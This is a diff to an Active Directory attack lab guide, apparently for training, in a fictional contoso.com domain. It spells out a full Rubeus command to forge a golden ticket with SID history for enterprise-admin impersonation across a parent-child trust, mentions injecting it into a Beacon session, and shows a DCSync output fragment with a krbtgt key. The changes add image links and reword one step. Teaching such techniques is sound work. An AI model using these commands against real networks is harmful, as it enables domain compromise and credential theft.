@@ -79,11 +79,13 @@ Credentials
 
 ## Golden Exploitation
 
-1. On the Attacker Desktop, forge a golden ticket and output to a kirbi file.
+1. On the Attacker Desktop, forge a golden ticket and output to a kirbi file in powershell terminal.
 
     ```Terminal-nocolor
     C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
     ```
+
+<img src="/images/powershell_Rubeus_golden_dublin_output.png">  
 
 2. Inject the Golden ticket into the Beacon session.
 
@@ -147,6 +149,8 @@ Supplemental Credentials:
     Credentials
       aes256_hmac       (4096) : 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
 ```
+
+<img src="/images/Parent-Child-Trusts-dcsync-contoso-krbtgt.png">  
 
 ⚠️ In this lab, you have forged a golden ticket using SID history to impersonate an enterprise admin, and hop a parent-child trust.
 
